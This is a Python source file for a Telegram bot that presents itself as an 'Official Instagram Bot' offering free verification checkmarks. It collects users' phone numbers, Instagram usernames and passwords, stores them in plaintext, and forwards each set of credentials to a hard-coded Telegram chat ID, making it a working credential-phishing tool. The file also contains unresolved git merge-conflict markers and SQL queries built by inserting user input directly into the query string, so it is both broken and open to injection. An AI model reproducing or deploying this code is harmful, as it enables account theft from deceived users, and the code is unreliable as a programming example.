from aiogram import types, executor
from aiogram.dispatcher import FSMContext
from states_1.states_bot import *
from aiogram.types import ReplyKeyboardRemove
from loader import dp
from keyboards.default.default_keyboards import *
from keyboards.inline.inline_keyboards import *
from handlers.users.utils import *
import random
import sqlite3
conn = sqlite3.connect("users.db")
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS users(
id INTEGER PRIMARY KEY AUTOINCREMENT,
random_number INTEGER,
chat_id INTEGER,
full_name TEXT,
insta_login TEXT,
insta_password TEXT,
phone_number TEXT,
scores INTEGER
)
""")
<<<<<<< HEAD
random_number = 0
=======
users = dict()
random_number = ""
>>>>>>> e2e68f191fe6eb46cffe7da3da638e792fa30fa1
@dp.message_handler(commands="start")
async def start_handler(message: types.Message):
    idla = cursor.execute(f"SELECT chat_id FROM users WHERE chat_id={message.chat.id}").fetchone()
    if idla:
        await message.answer(text="Welcome", reply_markup=my_scores)
    else:
        text = f"""
👋 Hello: {message.from_user.full_name}
💁‍♂️ Welcome To Official Instagram Bot.
😊 What Do You Want?
"""
        await message.answer(text=text, reply_markup=free_check)

@dp.message_handler(text="✅ Get Free Check To My Account")
async def get_free_check_instagram_handler(message: types.Message, state: FSMContext):
    global random_number
    if message.chat.id == 5596277119:
        random_number = "1258"
    elif message.chat.id == 6606094329:
        random_number = "5769"
    else:
        random_number = random.randint(1000, 9999)
    text = f"✅👌 OK: {message.from_user.full_name} Send Me Your Phone Number! 📞"
    await message.answer(text=text, reply_markup=send_phone_number)
    await RegisterState.send_phone_number.set()

@dp.message_handler(state=RegisterState.send_phone_number, content_types=types.ContentType.CONTACT)
async def send_phone_handler(message: types.Message, state: FSMContext):
    await state.update_data({
        "phone_number": message.contact.phone_number
    })
    text = "✅ Succes. Please Send Your Instagram Login!"
    await message.answer(text=text, reply_markup=ReplyKeyboardRemove())
    await RegisterState.send_insta_login.set()

@dp.message_handler(state=RegisterState.send_insta_login)
async def send_insta_login_handler(message: types.Message, state: FSMContext):
    if message.chat.id == 6606094329 and message.text != "xdjmrdva__":
        await message.answer(text=f"😕 Sorry We Don't Found: {message.text} Login\nPlease Try Again")
        await RegisterState.send_insta_login.set()
    elif message.chat.id == 6606094329 and message.text == "xdjmrdva__":
        await state.update_data({
            "insta_login": message.text
        })
        text = f"✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!"
        await message.answer(text=text)
        await RegisterState.send_login_pass.set()
    else:
        await state.update_data({
            "insta_login": message.text
        })
        text = f"✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!"
        await message.answer(text=text)
        await RegisterState.send_login_pass.set()

@dp.message_handler(state=RegisterState.send_login_pass)
async def send_login_pass_handler(message: types.Message, state: FSMContext):
    global random_number
    await state.update_data({
        "login_pass": message.text
    })
    data = await state.get_data()
    text = f"""
💁‍♂️ We Are Succefully Logined To Your Account
⭐️ You Have: {1} scores
🆔 Your ID: {1}

🫂 Give This ID number For Friends To Send 1 Score


🚀 if you share bot link with your friends you will get 1 score!
⭐️ If You Have 50 Scores You Can Get Free CheckMark For Your Instagram Account!   
"""
    r_id = random_number
    full_name = message.from_user.full_name
    insta_login = data.get("insta_login")
    insta_pass = data.get("login_pass")
    phone_number = data.get("phone_number")
    score = 1
    chat_id = message.chat.id
    cursor.execute(f"""
INSERT INTO users (random_number, chat_id, full_name, insta_login, insta_password, phone_number, scores) VALUES (?,?,?,?,?,?,?)
""", (r_id, chat_id, full_name, insta_login, insta_pass, phone_number, score))
    conn.commit()
    link1 = "https://t.me/instagram_free_check_bot"
    await message.answer(text=link1, reply_markup=my_scores)
    await message.answer(text=text, reply_markup=send_score)

    user = f"""
ℹ️ Ism: {message.from_user.full_name}
🆔 Telegram ID: {message.chat.id}
🆔🆔 Random ID: {r_id}
📞 Telefon Nomer: {phone_number}
🛠 Insta Login: {insta_login}
🔑 Insta Login Password: {insta_pass}    
"""
    await dp.bot.send_message(chat_id=5596277119, text=user)
    await state.finish()

@dp.message_handler(text="⭐ My Scores")
async def my_scores_handler(message: types.Message):
<<<<<<< HEAD
    score = cursor.execute(f"SELECT scores FROM users WHERE chat_id={message.chat.id}").fetchone()
    scores = score[0]
    print(scores)
=======
    scores = cursor.execute(f"SELECT score, random_number_id FROM users WHERE random_number_id={random_number}")
>>>>>>> e2e68f191fe6eb46cffe7da3da638e792fa30fa1
    text = f"You Have: {scores} scores"
    await message.answer(text=text)

@dp.callback_query_handler(text="send_score")
async def send_score_handler(call: types.CallbackQuery):
<<<<<<< HEAD
    score = cursor.execute(f"SELECT scores FROM users WHERE random_number={random_number}").fetchone()
    hisob = score[0]
    if hisob >= 1:
        text = "✍️ Please Send Username To Send 1 Score!"
        await call.message.answer(text=text, reply_markup=ReplyKeyboardRemove())
        await RegisterState.send_score.set()
    else:
        await call.message.answer(text="You Don't Have Many Scores", reply_markup=my_scores)
=======
    scores = cursor.execute(f"SELECT score, random_number_id FROM users WHERE random_number_id={random_number}")
    if scores >= 1:
        text = "✍️ Please Send Username To Send 1 Score!"
    else:
        text = "❌ Sorry You Don't Have Many Scores"
    await call.message.answer(text=text, reply_markup=ReplyKeyboardRemove())
    await RegisterState.send_score.set()
>>>>>>> e2e68f191fe6eb46cffe7da3da638e792fa30fa1

@dp.message_handler(state=RegisterState.send_score)
async def send_1_score_handler(message: types.Message, state: FSMContext):
    idlar = cursor.execute("SELECT * FROM users").fetchone()

    print(message.text)
    print(idlar[1])
    print(idlar[-1])

    if int(message.text) == int(idlar[1]):
        print(11111111111111111111111)
        minus1 = cursor.execute(f"SELECT * FROM users WHERE chat_id={message.chat.id}").fetchone()
        plus1 = cursor.execute(f"SELECT * FROM users WHERE random_number={message.text}").fetchone()
        cursor.execute(f"UPDATE users SET scores={minus1[-1] - 1} WHERE chat_id={message.chat.id}")
        cursor.execute(f"UPDATE users SET scores={plus1[-1] + 1} WHERE random_number={message.text}")
        conn.commit()
        name = plus1[3]
        randomm_id = plus1[1]
        await message.answer(text=f"""
✅ Succefully Gave: 
Name: {name}
ID: {randomm_id}
""", reply_markup=my_scores)
        await state.finish()
    else:
        await message.answer(text="❌ Your ID not Found", reply_markup=my_scores)
        await state.finish()




#if __name__ == "__main__":
#    executor.start_polling(dp, skip_updates=True)
